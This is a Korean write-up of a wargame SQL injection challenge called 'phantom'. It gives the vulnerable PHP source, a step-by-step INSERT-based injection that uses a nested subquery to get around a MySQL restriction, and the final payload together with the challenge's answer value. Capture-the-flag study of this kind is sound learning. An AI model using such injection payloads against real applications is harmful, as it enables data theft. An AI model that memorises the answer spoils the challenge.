# phantom

## 1. Code
```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect("phantom");

  if($_GET['joinmail']){
    if(preg_match('/duplicate/i', $_GET['joinmail'])) exit("nice try");
    $query = "insert into prob_phantom values(0,'{$_SERVER[REMOTE_ADDR]}','{$_GET[joinmail]}')";
    mysqli_query($db,$query);
    echo "<hr>query : <strong>{$query}</strong><hr>";
  }

  $rows = mysqli_query($db,"select no,ip,email from prob_phantom where no=1 or ip='{$_SERVER[REMOTE_ADDR]}'");
  echo "<table border=1><tr><th>ip</th><th>email</th></tr>";
    while(($result = mysqli_fetch_array($rows))){
    if($result['no'] == 1) $result['email'] = "**************";
    echo "<tr><td>{$result[ip]}</td><td>".htmlentities($result[email])."</td></tr>";
  }
  echo "</table>";

  $_GET[email] = addslashes($_GET[email]);
  $query = "select email from prob_phantom where no=1 and email='{$_GET[email]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['email']) && ($result['email'] === $_GET['email'])){ mysqli_query($db,"delete from prob_phantom where no != 1"); solve("phantom"); }
  highlight_file(__FILE__);
?>
```

## 2. Condition
- get 파라미터 `joinmail`을 받아, insert 쿼리를 실행한다.   
- insert되는 테이블은 no, ip, email로 이루어져 있고, ip는 `$_SERVER[REMOTEADDR]`로 받아온다.   
&rarr; `$_SERVER[REMOTE_ADDR]`는 웹서버에 접속한 접속자의 ip를 가진다.   
- 이후, database에서 `no=1`이거나 `ip=$_SERVER[REMOTE_ADDR]`라면 배열을 통해 값을 출력해준다.   
&rarr; 단, `no=1`이라면 email은 모자이크처리한다.   
- get 파라미터 `email`을 통해 값을 받고, `no=1`인 컬럼의 이메일 값과 비교 후 입력 데이터들을 초기화 함과 동시에 solve시킨다.   


## 3. Solution
필터링을 `duplicate`만을 하는것으로 큰 힌트를 얻었다.   
`select from where` 등을 통한 테이블 참조가 가능하므로,   
취약한 입력값 `joinmail`을 공략하였다.   


큰 빌드는 이렇다.   
>    INSERT문을 통해 또 다른 컬럼을 생성하여 그 값으로 `no=1`의 email을 집어넣기.    


문제가 간단하기에 내가 겪은 시행착오들을 같이 알아보기로 하자.     
우선, 무작정 쿼리문을 작성해 보았다.    
```sql
1234'), (0,'내 아이피',(select email from prob_phantom where ip='127.0.0.1'))#
```

결과는 실패다. 로컬 mysql에서 동일한 쿼리를 실행시켜보았다.    
```sql
mysql> select * from user;
+----+-------+---------+
| no | id    | pw      |
+----+-------+---------+
|  1 | guest | 1711888 |
|  2 | admin | 1711697 |
|  3 | a1    | 1234    |
|  4 | a2    | 1234    |
|  5 | aa    | 1234    |
|  6 | kkk   | kkk     |
|  7 | jjjj  | jjjj    |
|  8 | bbb   | guest   |
+----+-------+---------+
8 rows in set (0.00 sec)

mysql> insert into user(id,pw) values('adsf','asdf'),('asdf',(select pw from user where id='admin'));
ERROR 1093 (HY000): You can't specify target table 'user' for update in FROM clause
```

찾아본 결과 원인과 해결책은 다음과 같다.   
>    mysql에선 SELECT 부분에서 사용한 동일한 테이블은 변경할 수 없다.   
하지만, 그 사이에 SELECT 문으로 한번 더 감싼다면 참조가 가능하다.   
참고 : https://stackoverflow.com/questions/45494/mysql-error-1093-cant-specify-target-table-for-update-in-from-clause   



다시한번 쿼리를 재구성 해보자.   
```sql
mysql> insert into user(id,pw) values('adsf','asdf'),('asdf',(select * from (select pw from user where id='admin')));
ERROR 1248 (42000): Every derived table must have its own alias
```

또 다시 오류다.   
간단히 마지막 서브쿼리에 alias를 붙여주면 해결된다.   


```sql
mysql> insert into user(id,pw) values('adsf','asdf'),('asdf',(select * from (select pw from user where id='admin')x));
Query OK, 2 rows affected (0.03 sec)
Records: 2  Duplicates: 0  Warnings: 0

mysql> select * from user where id='asdf';
+----+------+---------+
| no | id   | pw      |
+----+------+---------+
| 10 | asdf | 1711697 |
+----+------+---------+
1 row in set (0.00 sec)
```

성공적으로 실행이 된다.   
이제 다시 문제로 돌아가서 최종 쿼리를 입력해보자.   

```sql
1234'), (0,'내 아이피',(select * from (select email from prob_phantom where ip='127.0.0.1')x))#
```

그럼, `no=1`의 email이 들어가 있는것을 확인할 수 있다.   
나온 email값을 get 파라미터 `email`에 넣어 보내주면, 문제가 해결된다.    

변수명 | 값
---|---
`email` | admin_secure_email@rubiya.kr